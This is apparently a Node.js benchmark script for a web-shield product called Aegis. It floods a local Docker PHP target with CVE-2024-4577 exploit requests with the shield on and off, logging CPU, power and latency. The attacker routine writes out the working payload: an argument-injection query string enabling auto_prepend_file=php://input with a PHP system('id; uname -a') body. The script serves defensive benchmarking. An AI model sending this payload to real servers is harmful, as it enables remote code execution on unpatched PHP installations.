#!/usr/bin/env node
/**
 * AEGIS SOVEREIGN GATE — Moteur d'Orchestration & Collecte Télémétrique Réelle
 * Exécute la rafale soutenue CVE-2024-4577 (PHP2Shell) en local AVEC vs SANS bouclier
 * et enregistre les compteurs matériels Intel RAPL, CPU hôte/conteneur, latence HTTP & Egress C2.
 */

import fs from 'node:fs';
import path from 'node:path';
import { spawn, execSync } from 'node:child_process';

const WORKSPACE_ROOT = '/home/andjurka/Work/aivo/Sites/Aegis';
const OUTPUT_DIR = path.join(WORKSPACE_ROOT, 'scripts/benchmark-video/output');
const RESULTS_FILE = path.join(OUTPUT_DIR, 'benchmark-data.json');

fs.mkdirSync(OUTPUT_DIR, { recursive: true });

// Paramètres calibrés pour produire ~45 secondes de mesures denses et irréfutables
const TIMELINE_CONFIG = {
  baselineMs: 4000,
  protectedMs: 14000,
  transitionMs: 4000,
  unprotectedMs: 15000,
  cooldownMs: 4000,
  waveIntervalMs: 320,
  concurrencyPerWave: 14,
  phpIterations: 420000
};

function runCmd(cmd) {
  return execSync(cmd, { cwd: WORKSPACE_ROOT, encoding: 'utf8' }).trim();
}

function setProtection(enabled) {
  const val = enabled ? 'true' : 'false';
  execSync(
    `docker exec aegis_bench_target sh -c 'curl -s -X POST "http://backend:80/api/v1/dashboard/protection" -H "Content-Type: application/json" -d "{\\"protection_enabled\\":${val}}" >/dev/null && curl -s -X POST "http://aegis_bench_edge:8000/_aegis/mode" -H "Content-Type: application/json" -d "{\\"protection_enabled\\":${val}}" >/dev/null'`,
    { cwd: WORKSPACE_ROOT }
  );
}

function unbanLocalIps() {
  execSync(
    `docker exec aegis_bench_target sh -c 'curl -s -X DELETE "http://backend:80/api/v1/dashboard/bans?ip=172.18.0.1" >/dev/null || true; curl -s -X DELETE "http://backend:80/api/v1/dashboard/bans?ip=127.0.0.1" >/dev/null || true'`,
    { cwd: WORKSPACE_ROOT }
  );
}

function parseProcStatCpu(line) {
  const parts = line.trim().split(/\s+/);
  if (!parts[0] || !parts[0].startsWith('cpu')) return null;
  const nums = parts.slice(1, 8).map(n => parseInt(n, 10) || 0);
  const [user, nice, system, idle, iowait, irq, softirq] = nums;
  const busy = user + nice + system + irq + softirq;
  const total = busy + idle + iowait;
  return { busy, total };
}

function getCpuInfo() {
  try {
    const model = runCmd(`docker exec aegis_telemetry_agent sh -c 'grep -m1 "model name" /host/proc/cpuinfo | cut -d: -f2'`);
    const cores = parseInt(runCmd(`docker exec aegis_telemetry_agent nproc`), 10) || 8;
    const maxUj = parseInt(runCmd(`docker exec aegis_telemetry_agent cat /host/sys/class/powercap/intel-rapl/intel-rapl:0/max_energy_range_uj`), 10) || 262143328850;
    return {
      cpuModel: model.trim(),
      cores,
      maxRaplRangeUj: maxUj,
      sensorSource: 'Intel RAPL Hardware Direct (/sys/class/powercap/intel-rapl:0) + Linux /proc/stat'
    };
  } catch {
    return {
      cpuModel: 'Host Multi-Core x86_64',
      cores: 8,
      maxRaplRangeUj: 262143328850,
      sensorSource: 'Intel RAPL Hardware Direct'
    };
  }
}

async function runAttackerBurst(phaseName, durationMs, startTimeMs, eventLogCallback) {
  // Exécute un attaquant Node HTTP keep-alive à l'intérieur du réseau Docker aegis_default
  // pour zéro surcharge OS sur l'hôte et des timestamps haute précision
  const attackerScript = `
    const http = require('node:http');
    const agent = new http.Agent({ keepAlive: true, maxSockets: 32 });
    const start = Date.now();
    const duration = ${durationMs};
    const waveMs = ${TIMELINE_CONFIG.waveIntervalMs};
    const concurrency = ${TIMELINE_CONFIG.concurrencyPerWave};
    const path = '/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input&iterations=${TIMELINE_CONFIG.phpIterations}&format=json';
    const body = Buffer.from("<?php system('id; uname -a'); ?>");
    let inflight = 0;

    function fireOne(seq) {
      if (Date.now() - start >= duration) return;
      if (inflight >= 22) return; // Evite la congestion infinie des sockets tout en saturant PHP-FPM (max_children=20)
      inflight++;
      const t0 = performance.now();
      const req = http.request({
        hostname: 'aegis_bench_edge',
        port: 8000,
        path,
        method: 'POST',
        agent,
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': body.length,
          'User-Agent': 'Mozilla/5.0 (Exploit/CVE-2024-4577-PHP2Shell)'
        },
        timeout: 6000
      }, (res) => {
        const chunks = [];
        res.on('data', c => chunks.push(c));
        res.on('end', () => {
          inflight--;
          const latMs = Math.max(0.2, +(performance.now() - t0).toFixed(2));
          let verdict = res.headers['x-aegis-verdict'] || (res.statusCode === 403 ? 'BLOCKED' : 'BYPASSED');
          let threat = res.headers['x-aegis-threat'] || 'CVE-2024-4577_PHP2SHELL';
          let c2 = false;
          let cpuBurnMs = 0;
          try {
            const parsed = JSON.parse(Buffer.concat(chunks).toString('utf8'));
            if (parsed.status === 'COMPROMISED_SIMULATION_EXECUTED') {
              verdict = 'EXPLOITED';
              c2 = Boolean(parsed.c2_egress_callback_triggered);
              cpuBurnMs = Number(parsed.cpu_burn_ms || 0);
            } else if (parsed.threat_detected) {
              threat = parsed.threat_detected;
            }
          } catch {}
          console.log(JSON.stringify({
            type: 'http_req',
            ts: Date.now(),
            seq,
            status: res.statusCode,
            latency_ms: latMs,
            verdict,
            threat,
            c2,
            cpu_burn_ms: cpuBurnMs
          }));
        });
      });
      req.on('error', () => { inflight--; });
      req.on('timeout', () => { req.destroy(); inflight--; });
      req.write(body);
      req.end();
    }

    let seq = 0;
    // Tir immédiat puis cadence régulière identique entre Phase 1 et Phase 2
    const interval = setInterval(() => {
      if (Date.now() - start >= duration) {
        clearInterval(interval);
        setTimeout(() => process.exit(0), 2500);
        return;
      }
      for (let i = 0; i < concurrency; i++) {
        fireOne(++seq);
      }
    }, waveMs);
  `;

  return new Promise(resolve => {
    const child = spawn(
      'docker',
      ['run', '--rm', '--network', 'aegis_default', 'node:20-alpine', 'node', '-e', attackerScript],
      { cwd: WORKSPACE_ROOT }
    );

    let buffer = '';
    child.stdout.on('data', chunk => {
      buffer += chunk.toString();
      const lines = buffer.split('\n');
      buffer = lines.pop() || '';
      for (const line of lines) {
        if (!line.trim()) continue;
        try {
          const ev = JSON.parse(line);
          ev.elapsed_ms = ev.ts - startTimeMs;
          ev.phase = phaseName;
          eventLogCallback(ev);
        } catch {}
      }
    });

    child.on('close', () => resolve());
  });
}

async function main() {
  console.log('🚀 [Aegis Video Benchmark] Initialisation du banc de test local...');
  const hwInfo = getCpuInfo();
  console.log(`💻 Processeur détecté : ${hwInfo.cpuModel} (${hwInfo.cores} vCPUs)`);
  console.log(`⚡ Sonde active : ${hwInfo.sensorSource}`);

  // Assurer que la cible et l'edge sont démarrés
  execSync('docker compose -f scripts/benchmark-video/docker-compose.bench.yml up -d', {
    cwd: WORKSPACE_ROOT,
    stdio: 'inherit'
  });

  // Attendre 1.5s puis activer le bouclier et nettoyer les bans de test
  await new Promise(r => setTimeout(r, 1500));
  unbanLocalIps();
  setProtection(true);

  const samples = [];
  const httpEvents = [];
  const phases = [];
  let currentPhase = 'baseline';
  let currentShield = true;

  // Suivi conteneurs (docker stats streaming)
  const containerCpu = {
    aegis_bench_target: 0,
    aegis_bench_edge: 0
  };
  const statsChild = spawn('docker', [
    'stats',
    '--format',
    '{{.Name}}|{{.CPUPerc}}',
    'aegis_bench_target',
    'aegis_bench_edge'
  ]);
  statsChild.stdout.on('data', chunk => {
    const clean = chunk.toString().replace(/\x1b\[[0-9;]*[a-zA-Z]/g, '');
    for (const line of clean.split('\n')) {
      const [name, pct] = line.trim().split('|');
      if (name && pct && (name === 'aegis_bench_target' || name === 'aegis_bench_edge')) {
        const val = parseFloat(pct.replace('%', ''));
        if (!Number.isNaN(val)) containerCpu[name] = val;
      }
    }
  });

  // Flux continu Intel RAPL + /proc/stat dans aegis_telemetry_agent (échantillon toutes les 400ms)
  const raplSampler = spawn('docker', [
    'exec',
    'aegis_telemetry_agent',
    'sh',
    '-c',
    'while true; do u=$(cat /host/sys/class/powercap/intel-rapl/intel-rapl:0/energy_uj); s=$(head -n 1 /host/proc/stat); echo "$u|$s"; usleep 400000; done'
  ]);

  let prevRaplUj = null;
  let prevCpu = null;
  let prevTs = null;
  const startTimeMs = Date.now();
  let lastReqWindow = [];

  raplSampler.stdout.on('data', chunk => {
    const lines = chunk.toString().trim().split('\n');
    for (const line of lines) {
      const [ujStr, statStr] = line.split('|');
      const now = Date.now();
      const currUj = parseInt(ujStr, 10);
      const currCpu = parseProcStatCpu(statStr || '');
      if (!currUj || !currCpu) continue;

      if (prevRaplUj !== null && prevCpu !== null && prevTs !== null) {
        const dt = (now - prevTs) / 1000.0;
        if (dt > 0.1) {
          const deltaUj = currUj >= prevRaplUj
            ? (currUj - prevRaplUj)
            : (hwInfo.maxRaplRangeUj - prevRaplUj + currUj);
          const watts = Math.min(180, Math.max(1.0, +(deltaUj / 1_000_000 / dt).toFixed(2)));

          const totalDiff = currCpu.total - prevCpu.total;
          const busyDiff = currCpu.busy - prevCpu.busy;
          const hostCpuPct = totalDiff > 0
            ? Math.min(100, Math.max(0, +((busyDiff / totalDiff) * 100).toFixed(1)))
            : 0;

          // Statistiques HTTP de la fenêtre courante (~1s glissante)
          const recentReqs = lastReqWindow.filter(r => now - r.ts <= 1200);
          lastReqWindow = recentReqs;
          const avgLat = recentReqs.length > 0
            ? +(recentReqs.reduce((s, r) => s + r.latency_ms, 0) / recentReqs.length).toFixed(1)
            : 0;

          samples.push({
            elapsed_ms: now - startTimeMs,
            phase: currentPhase,
            shield_active: currentShield,
            watts,
            joules_delta: +(deltaUj / 1_000_000).toFixed(2),
            host_cpu_pct: hostCpuPct,
            target_cpu_pct: +(containerCpu.aegis_bench_target).toFixed(1),
            edge_cpu_pct: +(containerCpu.aegis_bench_edge).toFixed(1),
            recent_rps: recentReqs.length,
            recent_latency_ms: avgLat
          });
        }
      }
      prevRaplUj = currUj;
      prevCpu = currCpu;
      prevTs = now;
    }
  });

  const recordHttpEvent = ev => {
    httpEvents.push(ev);
    lastReqWindow.push(ev);
  };

  // PHASE 0 : BASELINE (Serveur calme au repos)
  console.log('⏱️  [0/4] Enregistrement Baseline au repos (4s)...');
  currentPhase = 'baseline';
  currentShield = true;
  phases.push({ id: 'baseline', start_ms: Date.now() - startTimeMs, shield_active: true });
  await new Promise(r => setTimeout(r, TIMELINE_CONFIG.baselineMs));

  // PHASE 1 : RAFALE PHP2SHELL AVEC BOUCLIER AEGIS ACTIF
  console.log('🛡️  [1/4] Phase 1 — Rafale soutenue CVE-2024-4577 PHP2Shell AVEC Bouclier Aegis (14s)...');
  currentPhase = 'protected';
  currentShield = true;
  phases.push({ id: 'protected', start_ms: Date.now() - startTimeMs, shield_active: true });
  await runAttackerBurst('protected', TIMELINE_CONFIG.protectedMs, startTimeMs, recordHttpEvent);
  const protectedEndMs = Date.now() - startTimeMs;

  // TRANSITION : DÉSACTIVATION DU BOUCLIER EN DIRECT
  console.log('⚡ [2/4] Bascule en direct : Bouclier Aegis ACTIF → DÉSACTIVÉ (4s)...');
  currentPhase = 'transition';
  currentShield = false;
  phases.push({ id: 'transition', start_ms: protectedEndMs, shield_active: false });
  setProtection(false);
  await new Promise(r => setTimeout(r, TIMELINE_CONFIG.transitionMs));

  // PHASE 2 : RAFALE IDENTIQUE SANS BOUCLIER
  console.log('💥 [3/4] Phase 2 — Même rafale PHP2Shell SANS Bouclier (15s)...');
  currentPhase = 'unprotected';
  currentShield = false;
  phases.push({ id: 'unprotected', start_ms: Date.now() - startTimeMs, shield_active: false });
  await runAttackerBurst('unprotected', TIMELINE_CONFIG.unprotectedMs, startTimeMs, recordHttpEvent);

  // PHASE 3 : RÉACTIVATION & RETOUR AU CALME
  console.log('🔄 [4/4] Réactivation du bouclier Aegis et refroidissement (4s)...');
  currentPhase = 'cooldown';
  currentShield = true;
  setProtection(true);
  phases.push({ id: 'cooldown', start_ms: Date.now() - startTimeMs, shield_active: true });
  await new Promise(r => setTimeout(r, TIMELINE_CONFIG.cooldownMs));

  const totalDurationMs = Date.now() - startTimeMs;
  raplSampler.kill();
  statsChild.kill();

  // Calcul du bilan comparatif audit-grade
  const p1Samples = samples.filter(s => s.phase === 'protected');
  const p2Samples = samples.filter(s => s.phase === 'unprotected');
  const baseSamples = samples.filter(s => s.phase === 'baseline');

  const avg = (arr, fn) => arr.length ? +(arr.reduce((s, x) => s + fn(x), 0) / arr.length).toFixed(2) : 0;
  const max = (arr, fn) => arr.length ? +(Math.max(...arr.map(fn))).toFixed(2) : 0;
  const sum = (arr, fn) => +(arr.reduce((s, x) => s + fn(x), 0)).toFixed(2);

  const p1Reqs = httpEvents.filter(e => e.phase === 'protected');
  const p2Reqs = httpEvents.filter(e => e.phase === 'unprotected');

  const avgWattsBase = avg(baseSamples, s => s.watts);
  const avgWattsP1 = avg(p1Samples, s => s.watts);
  const peakWattsP1 = max(p1Samples, s => s.watts);
  const totalJoulesP1 = sum(p1Samples, s => s.joules_delta);

  const avgWattsP2 = avg(p2Samples, s => s.watts);
  const peakWattsP2 = max(p2Samples, s => s.watts);
  const totalJoulesP2 = sum(p2Samples, s => s.joules_delta);

  const summary = {
    total_duration_ms: totalDurationMs,
    baseline: {
      avg_watts: avgWattsBase,
      avg_host_cpu_pct: avg(baseSamples, s => s.host_cpu_pct)
    },
    protected: {
      requests_sent: p1Reqs.length,
      blocked_count: p1Reqs.filter(r => r.status === 403 || r.status === 413).length,
      avg_latency_ms: avg(p1Reqs, r => r.latency_ms),
      avg_watts: avgWattsP1,
      peak_watts: peakWattsP1,
      total_joules: totalJoulesP1,
      avg_host_cpu_pct: avg(p1Samples, s => s.host_cpu_pct),
      peak_host_cpu_pct: max(p1Samples, s => s.host_cpu_pct),
      avg_target_cpu_pct: avg(p1Samples, s => s.target_cpu_pct),
      peak_target_cpu_pct: max(p1Samples, s => s.target_cpu_pct),
      egress_c2_triggers: 0
    },
    unprotected: {
      requests_sent: p2Reqs.length,
      exploited_count: p2Reqs.filter(r => r.verdict === 'EXPLOITED' || r.status === 200).length,
      avg_latency_ms: avg(p2Reqs, r => r.latency_ms),
      avg_watts: avgWattsP2,
      peak_watts: peakWattsP2,
      total_joules: totalJoulesP2,
      avg_host_cpu_pct: avg(p2Samples, s => s.host_cpu_pct),
      peak_host_cpu_pct: max(p2Samples, s => s.host_cpu_pct),
      avg_target_cpu_pct: avg(p2Samples, s => s.target_cpu_pct),
      peak_target_cpu_pct: max(p2Samples, s => s.target_cpu_pct),
      egress_c2_triggers: p2Reqs.filter(r => r.c2).length
    },
    deltas: {
      watts_increase_pct: avgWattsP1 > 0 ? +(((avgWattsP2 - avgWattsP1) / avgWattsP1) * 100).toFixed(1) : 0,
      peak_watts_delta: +(peakWattsP2 - avgWattsP1).toFixed(2),
      extra_joules_burned: +(totalJoulesP2 - totalJoulesP1).toFixed(1),
      energy_multiplier: totalJoulesP1 > 0 ? +(totalJoulesP2 / totalJoulesP1).toFixed(2) : 1
    }
  };

  // Échantillonner un sous-ensemble fluide pour l'affichage des logs terminal dans le studio
  const terminalFeed = httpEvents.filter((_, idx) => idx % 2 === 0 || _.verdict === 'EXPLOITED').slice(0, 400);

  const report = {
    generated_at: new Date().toISOString(),
    hardware: hwInfo,
    phases,
    summary,
    samples,
    terminal_feed: terminalFeed
  };

  fs.writeFileSync(RESULTS_FILE, JSON.stringify(report, null, 2));
  console.log('\n=======================================================================');
  console.log('📊 BILAN RÉEL DE LA CAMPAGNE LOCALE');
  console.log('=======================================================================');
  console.log(`🛡️  AVEC Bouclier Aegis : ${summary.protected.blocked_count}/${summary.protected.requests_sent} bloquées (${summary.protected.avg_latency_ms} ms) | RAPL moy ${summary.protected.avg_watts}W (pic ${summary.protected.peak_watts}W) | PHP-FPM CPU moy ${summary.protected.avg_target_cpu_pct}%`);
  console.log(`💥 SANS Bouclier       : ${summary.unprotected.exploited_count}/${summary.unprotected.requests_sent} compromises (${summary.unprotected.avg_latency_ms} ms) | RAPL moy ${summary.unprotected.avg_watts}W (pic ${summary.unprotected.peak_watts}W) | PHP-FPM CPU pic ${summary.unprotected.peak_target_cpu_pct}%`);
  console.log(`⚡ Delta Énergétique   : +${summary.deltas.watts_increase_pct}% Watts moyens | +${summary.deltas.extra_joules_burned} J gaspillés`);
  console.log(`📁 Fichier généré      : ${RESULTS_FILE}`);
}

main().catch(err => {
  console.error(err);
  process.exit(1);
});
